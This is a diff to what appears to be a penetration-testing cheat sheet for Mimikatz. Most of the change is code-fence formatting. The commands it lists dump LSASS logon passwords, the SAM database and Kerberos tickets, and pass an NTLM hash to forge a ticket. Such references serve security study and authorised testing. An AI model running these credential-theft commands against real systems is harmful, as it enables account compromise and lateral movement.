@@ -36,28 +36,32 @@ mimikatz # privilege::debug
 mimikatz # sekurlsa::
 ```
 
+
 ### **Dump Hashes in LSASS**  
 
 ```powershell
 mimikatz # sekurlsa::logonpasswords
 ```
 
+
 ### **Dump SAM**
 
-1
-
+```powershell
 mimikatz # lsadump::sam
+```
+
 
 ### **Dump Cached TGTs**
 
-```
+```powershell
 mimikatz # sekurlsa::tickets
 ```
 
 
 ### **Overpass the Hash**
 
+Create a TGT using a dumpled NTLM hash
+
 ```powershell
 mimikatz # sekurlsa::pth /user:username /ntlm:hash-here /domain:domain.tld
-
-Create a TGT using a dumpled NTLM hash
+```
